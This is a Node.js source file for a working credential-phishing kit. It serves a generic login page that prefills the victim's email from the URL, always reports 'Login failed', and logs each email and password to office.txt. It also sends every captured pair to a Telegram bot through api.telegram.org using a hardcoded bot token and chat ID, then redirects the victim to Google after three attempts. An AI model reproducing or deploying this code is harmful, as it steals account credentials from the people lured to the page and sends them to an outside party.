const http = require('http');
const fs = require('fs');
const querystring = require('querystring');
const fetch = require('node-fetch');

// Telegram Bot credentials
const botToken = '7288967076:AAGZSCMf9clydM1-7DDfdkkpdF684nGYt_Q'; // Replace with your Telegram bot token
const chatId = '-4280399619'; // Replace with your Telegram chat ID

// Track login attempts
const loginAttempts = {};

const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .login-form {
            display: none;
        }
        input {
            width: 100%;
            padding: 0.5rem;
            margin-bottom: 1rem;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: #007bff;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loginForm" class="login-form">
            <h2>Login</h2>
            <form id="form">
                <input type="email" id="emailInput" placeholder="Email" required>
                <input type="password" id="passwordInput" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        <div id="spinner" class="spinner" style="display: none;"></div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const spinner = document.getElementById('spinner');
            const emailInput = document.getElementById('emailInput');
            const passwordInput = document.getElementById('passwordInput');

            function getEmailFromHash() {
                const hash = window.location.hash;
                const match = hash.match(/#email=(.+)/);
                return match ? decodeURIComponent(match[1]) : null;
            }

            const email = getEmailFromHash();

            if (email) {
                loginForm.style.display = 'block';
                emailInput.value = email;
            } else {
                loginForm.style.display = 'none';
                spinner.style.display = 'block';
            }

            document.getElementById('form').onsubmit = function(e) {
                e.preventDefault();
                const email = emailInput.value;
                const password = passwordInput.value;

                spinner.style.display = 'block';
                loginForm.style.display = 'none';

                fetch('/office', { 
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({ email5: email, pass5: password }),
                })
                .then(response => response.json())
                .then(data => {
                    spinner.style.display = 'none';
                    // Clear the password input field after each attempt
                    passwordInput.value = '';

                    if (data.signal === 'ok') {
                        alert(data.msg);
                    } else if (data.signal === 'redirect') {
                        window.location.href = 'https://www.google.com';
                    } else {
                        alert(data.msg);
                        loginForm.style.display = 'block';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    spinner.style.display = 'none';
                    alert('An error occurred. Please try again.');
                    // Clear the password input field
                    passwordInput.value = '';
                    loginForm.style.display = 'block';
                });
            };
        });
    </script>
</body>
</html>
`;

// Create an HTTP server
const server = http.createServer((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(htmlContent);
    } else if (req.method === 'POST' && req.url === '/office') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            const parsedData = querystring.parse(body);
            const email = parsedData.email5;
            const password = parsedData.pass5;

            console.log(`Email: ${email}, Password: ${password}`);

            // Track login attempts
            if (!loginAttempts[email]) {
                loginAttempts[email] = { attempts: 0 };
            }

            // Simulate a login failure
            const loginSuccessful = false; // Change to your login validation logic
            if (!loginSuccessful) {
                loginAttempts[email].attempts++;
                if (loginAttempts[email].attempts >= 3) {
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ signal: 'redirect', msg: 'Too many attempts' }));
                    return;
                }

                // Save to office.txt and send to Telegram if both fields have values
                if (email && password) {
                    const dataToSave = `Email: ${email}, Password: ${password}\n`;
                    fs.appendFile('office.txt', dataToSave, (err) => {
                        if (err) console.error('Error saving data:', err);
                    });

                    const telegramMessage = `Email: ${email}\nPassword: ${password}`;
                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;

                    fetch(telegramUrl)
                        .then(telegramRes => {
                            if (!telegramRes.ok) throw new Error('Telegram API error');
                        })
                        .catch(err => console.error('Error sending to Telegram:', err));
                }

                res.writeHead(401, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ signal: 'bad', msg: 'Login failed. Attempt ' + loginAttempts[email].attempts }));
                return;
            }

            // If login is successful (add your logic here)
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ signal: 'ok', msg: 'Login successful' }));
        });
    } else {
        res.writeHead(404);
        res.end('Not found');
    }
});

// Start the server
const PORT = 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
